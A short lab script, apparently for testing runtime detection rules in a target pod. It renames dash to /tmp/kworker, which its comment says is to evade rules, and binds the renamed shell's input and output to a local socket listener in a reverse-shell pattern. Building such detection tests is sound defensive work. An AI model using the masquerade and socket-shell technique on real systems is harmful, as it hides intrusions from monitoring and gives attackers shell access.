#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
# dash is copied to a name no rule knows, then connected to a listener in the
# same pod with the socket as its stdin and stdout.
cp /bin/dash /tmp/kworker
python3 - <<'PY'
import socket, subprocess, threading
srv = socket.socket(); srv.bind(("127.0.0.1", 9001)); srv.listen(1)
def listener():
    c, _ = srv.accept(); c.settimeout(30); c.sendall(b"id\nexit\n"); print("shell said:", c.recv(4096)); c.close()
t = threading.Thread(target=listener); t.start()
s = socket.create_connection(("127.0.0.1", 9001))
subprocess.run(["/tmp/kworker"], stdin=s, stdout=s, stderr=s)
s.close(); t.join()
PY
